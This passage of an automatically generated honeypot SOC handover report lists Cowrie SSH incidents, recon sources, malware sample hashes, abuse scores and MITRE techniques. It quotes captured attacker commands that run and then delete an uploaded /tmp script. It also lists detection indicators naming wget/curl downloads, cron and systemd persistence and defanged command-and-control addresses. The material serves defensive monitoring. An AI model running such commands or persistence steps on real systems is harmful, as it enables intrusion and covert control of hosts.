| `2026-09-24 12:30:22` | `cowrie.session.file_download` |
| `2026-09-24 12:30:22` | `cowrie.log.closed` |
| `2026-09-24 12:30:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.211.72[.]167` to AbuseIPDB if not already reported
- [ ] Block `81.211.72[.]167` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb8f05482444

| Field | Detail |
|---|---|
| **Source IP** | `81.211.72[.]167` |
| **First Seen** | 2026-09-24 12:30 |
| **Last Seen** | 2026-09-24 12:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 12:30:22` | `cowrie.session.connect` |
| `2026-09-24 12:30:22` | `cowrie.client.version` |
| `2026-09-24 12:30:22` | `cowrie.client.kex` |
| `2026-09-24 12:30:22` | `cowrie.login.success` |
| `2026-09-24 12:30:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.211.72[.]167` to AbuseIPDB if not already reported
- [ ] Block `81.211.72[.]167` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed978e304205

| Field | Detail |
|---|---|
| **Source IP** | `81.211.72[.]167` |
| **First Seen** | 2026-09-24 12:30 |
| **Last Seen** | 2026-09-24 12:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 12:30:23` | `cowrie.session.connect` |
| `2026-09-24 12:30:23` | `cowrie.client.version` |
| `2026-09-24 12:30:23` | `cowrie.client.kex` |
| `2026-09-24 12:30:23` | `cowrie.login.success` |
| `2026-09-24 12:30:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.211.72[.]167` to AbuseIPDB if not already reported
- [ ] Block `81.211.72[.]167` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf17733e9145

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-09-24 12:35 |
| **Last Seen** | 2026-09-24 12:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 12:35:06` | `cowrie.session.connect` |
| `2026-09-24 12:35:06` | `cowrie.client.version` |
| `2026-09-24 12:35:06` | `cowrie.client.kex` |
| `2026-09-24 12:35:07` | `cowrie.login.success` |
| `2026-09-24 12:35:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bd5ce6a3dc1

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-09-24 12:35 |
| **Last Seen** | 2026-09-24 12:37 |
| **Session Duration** | 127s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 12:35:09` | `cowrie.session.connect` |
| `2026-09-24 12:35:09` | `cowrie.client.version` |
| `2026-09-24 12:35:09` | `cowrie.client.kex` |
| `2026-09-24 12:35:09` | `cowrie.login.success` |
| `2026-09-24 12:35:10` | `cowrie.session.file_upload` |
| `2026-09-24 12:35:11` | `cowrie.session.params` |
| `2026-09-24 12:35:11` | `cowrie.command.input` |
| `2026-09-24 12:35:11` | `cowrie.command.input` |
| `2026-09-24 12:35:11` | `cowrie.command.input` |
| `2026-09-24 12:35:11` | `cowrie.command.failed` |
| `2026-09-24 12:35:11` | `cowrie.log.closed` |
| `2026-09-24 12:35:12` | `cowrie.session.params` |
| `2026-09-24 12:35:12` | `cowrie.command.input` |
| `2026-09-24 12:35:12` | `cowrie.log.closed` |
| `2026-09-24 12:35:12` | `cowrie.session.params` |
| `2026-09-24 12:35:12` | `cowrie.command.input` |
| `2026-09-24 12:35:13` | `cowrie.log.closed` |
| `2026-09-24 12:35:13` | `cowrie.session.params` |
| `2026-09-24 12:35:13` | `cowrie.command.input` |
| `2026-09-24 12:35:13` | `cowrie.command.failed` |
| `2026-09-24 12:35:13` | `cowrie.command.failed` |
| `2026-09-24 12:36:14` | `cowrie.session.params` |
| `2026-09-24 12:36:14` | `cowrie.command.input` |
| `2026-09-24 12:37:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-224deccc1321

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-09-24 12:35 |
| **Last Seen** | 2026-09-24 12:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 12:35:13` | `cowrie.session.connect` |
| `2026-09-24 12:35:13` | `cowrie.client.version` |
| `2026-09-24 12:35:13` | `cowrie.client.kex` |
| `2026-09-24 12:35:14` | `cowrie.login.success` |
| `2026-09-24 12:35:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2498d5f2e21

| Field | Detail |
|---|---|
| **Source IP** | `165.1.75[.]106` |
| **First Seen** | 2026-09-24 12:37 |
| **Last Seen** | 2026-09-24 12:39 |
| **Session Duration** | 126s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 12:37:27` | `cowrie.session.connect` |
| `2026-09-24 12:37:27` | `cowrie.client.version` |
| `2026-09-24 12:37:27` | `cowrie.client.kex` |
| `2026-09-24 12:37:27` | `cowrie.login.success` |
| `2026-09-24 12:37:28` | `cowrie.session.file_upload` |
| `2026-09-24 12:37:29` | `cowrie.session.params` |
| `2026-09-24 12:37:29` | `cowrie.command.input` |
| `2026-09-24 12:37:29` | `cowrie.command.input` |
| `2026-09-24 12:37:29` | `cowrie.command.input` |
| `2026-09-24 12:37:29` | `cowrie.command.failed` |
| `2026-09-24 12:37:29` | `cowrie.log.closed` |
| `2026-09-24 12:37:29` | `cowrie.session.params` |
| `2026-09-24 12:37:30` | `cowrie.command.input` |
| `2026-09-24 12:37:30` | `cowrie.log.closed` |
| `2026-09-24 12:37:30` | `cowrie.session.params` |
| `2026-09-24 12:37:30` | `cowrie.command.input` |
| `2026-09-24 12:37:30` | `cowrie.log.closed` |
| `2026-09-24 12:37:31` | `cowrie.session.params` |
| `2026-09-24 12:37:31` | `cowrie.command.input` |
| `2026-09-24 12:37:31` | `cowrie.command.failed` |
| `2026-09-24 12:37:31` | `cowrie.command.failed` |
| `2026-09-24 12:38:32` | `cowrie.session.params` |
| `2026-09-24 12:38:32` | `cowrie.command.input` |
| `2026-09-24 12:39:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.1.75[.]106` to AbuseIPDB if not already reported
- [ ] Block `165.1.75[.]106` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `115.245.185[.]82` | **18** | 2026-09-24 12:24 | 2026-09-24 12:55 | 6m | 0 | `T1592` | 🟠 MEDIUM |
| `137.184.5[.]188` | **6** | 2026-09-24 09:38 | 2026-09-24 12:38 | 4m | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | **3** | 2026-09-24 09:06 | 2026-09-24 11:03 | 1m | 0 | `T1592` | 🟢 LOW |
| `198.163.195[.]63` | **2** | 2026-09-24 11:37 | 2026-09-24 11:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `217.196.163[.]136` | **2** | 2026-09-24 09:08 | 2026-09-24 09:12 | 0m | 0 | `T1592` | 🟢 LOW |
| `47.254.195[.]162` | **2** | 2026-09-24 12:19 | 2026-09-24 12:20 | 0m | 0 | `T1592` | 🟢 LOW |
| `106.12.241[.]195` | 1 | 2026-09-24 09:51 | 2026-09-24 09:51 | 14s | 0 | `T1592` | 🟢 LOW |
| `142.93.69[.]27` | 1 | 2026-09-24 11:56 | 2026-09-24 11:57 | 36s | 0 | `T1592` | 🟢 LOW |
| `172.236.127[.]133` | 1 | 2026-09-24 10:30 | 2026-09-24 10:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `173.255.221[.]189` | 1 | 2026-09-24 09:35 | 2026-09-24 09:35 | 2s | 0 | `T1592` | 🟢 LOW |
| `192.253.248[.]251` | 1 | 2026-09-24 11:44 | 2026-09-24 11:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `211.185.14[.]39` | 1 | 2026-09-24 10:54 | 2026-09-24 10:55 | 21s | 0 | `T1592` | 🟢 LOW |
| `213.177.179[.]195` | 1 | 2026-09-24 10:03 | 2026-09-24 10:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `213.55.240[.]221` | 1 | 2026-09-24 10:25 | 2026-09-24 10:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `37.113.198[.]127` | 1 | 2026-09-24 12:25 | 2026-09-24 12:25 | 30s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]141` | 1 | 2026-09-24 10:06 | 2026-09-24 10:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.211[.]97` | 1 | 2026-09-24 10:35 | 2026-09-24 10:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `59.7.131[.]145` | 1 | 2026-09-24 10:54 | 2026-09-24 10:55 | 29s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-09-24 11:59 | 2026-09-24 11:59 | 0s | 0 | `T1592` | 🟢 LOW |
| `80.6.229[.]199` | 1 | 2026-09-24 10:10 | 2026-09-24 10:10 | 11s | 0 | `T1592` | 🟢 LOW |
| `81.56.89[.]227` | 1 | 2026-09-24 12:54 | 2026-09-24 12:54 | 13s | 0 | `T1592` | 🟢 LOW |
| `89.21.67[.]131` | 1 | 2026-09-24 09:30 | 2026-09-24 09:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `89.21.67[.]140` | 1 | 2026-09-24 09:30 | 2026-09-24 09:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `93.123.109[.]6` | 1 | 2026-09-24 10:30 | 2026-09-24 10:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `93.123.109[.]6` | 1 | 2026-09-24 12:37 | 2026-09-24 12:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]69` | 1 | 2026-09-24 12:39 | 2026-09-24 12:39 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0c082e5b76630d08145c7badd020060e0ce50e333a9f28d39fe15ad6afc49d77` | Bash Script | `0c082e5b76630d08...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `0cd01e621dce7d42e6d6db50ef3e16170e3b737586863ec600826c7b0d3ed423` | Unknown binary | `0cd01e621dce7d42...` | 0/100 | 🟢 LOW | Not in VT |
| `0db4656687a425c47d19000db866db52c7e415dbfaf6b5c651adcb9275ab23ca` | Unknown binary | `0db4656687a425c4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `13960b7e69159907f67f84ce6398d29f73686602ef2c36d837237288f4fe8785` | Bash Script | `13960b7e69159907...` | 58/100 | 🟡 MEDIUM | **20/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **31/70** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **27/75** 🔴 |
| `1bc1c784057dc4e36fcc913fe03b1f0cae8474063b486ae3443b9ef8bced9548` | Bash Script | `1bc1c784057dc4e3...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `1bd3745a4f9043ead807d7777669b0dbf5b56985e5b3dd9d7cff8384154ea4a8` | ELF Binary (Linux executable) (x86-64 64-bit) | `1bd3745a4f9043ea...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` | Shell Script | `1d64be0ba1bd9924...` | 72/100 | 🔴 HIGH | **7/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 38/100 | 🟢 LOW | **21/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |

**Suspicious Indicators — HIGH Severity Samples:**

_`07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` (07c0a0af63dde8dc2e36dc58...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Execution from /tmp` — `/tmp/bot`
- `chmod +x (make executable)` — `chmod +x`
- `Cron persistence` — `crontab`
- `RC script persistence` — `/etc/rc.`
- `Systemd persistence` — `systemctl enable`
- `IP:Port (possible C2)` — `64.89.160[.]222:55487`

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

_`1d64be0ba1bd9924c3e29ae460db9407e4e33afeb864c9e39377ae4a87fa09db` (1d64be0ba1bd9924c3e29ae4...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Hardware recon` — `cat /proc/cpuinfo`
- `IP:Port (possible C2)` — `198.144.179[.]82:80`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `45.148.10[.]141` | NL | TECHOFF SRV LIMITED | **100** ⚠️ | 50 |
| `142.93.69[.]27` | US | DigitalOcean, LLC | **100** ⚠️ | 32 |
| `80.6.229[.]199` | GB | Virgin Media Limited | **100** ⚠️ | 4 |
| `211.185.14[.]39` | KR | Korea Telecom | **100** ⚠️ | 0 |
| `43.134.49[.]202` | SG | Asia Pacific Network Information Center, Pty. Ltd. | **100** ⚠️ | 46 |
| `115.245.185[.]82` | IN | Reliance Jio Infocomm Limited | **100** ⚠️ | 6 |
| `173.255.221[.]189` | US | Linode | **100** ⚠️ | 50 |
| `137.184.5[.]188` | US | DigitalOcean, LLC | **100** ⚠️ | 50 |
| `179.255.244[.]206` | BR | V tal | **100** ⚠️ | 22 |
| `45.79.211[.]97` | US | Linode | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1078](https://attack.mitre.org/techniques/T1078) | 59 |
| [T1592](https://attack.mitre.org/techniques/T1592) | 58 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 18 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 13 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 4 |

---

## 🔕 False Positive Summary (37 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 5 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 6 |
| AbuseIPDB score 8 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 23 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 148 cases |
| Tool 34  | Credential Extractor        | ✅ 92 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 9 fingerprints |
| Tool 36  | Command Clustering          | ✅ 6 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 63 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 37 filtered (25.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 35 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 23 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 58 priority case(s) shown individually · 26 recon entry/entries in table (6 group(s) consolidating 33 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-09-24T14:46:14Z_
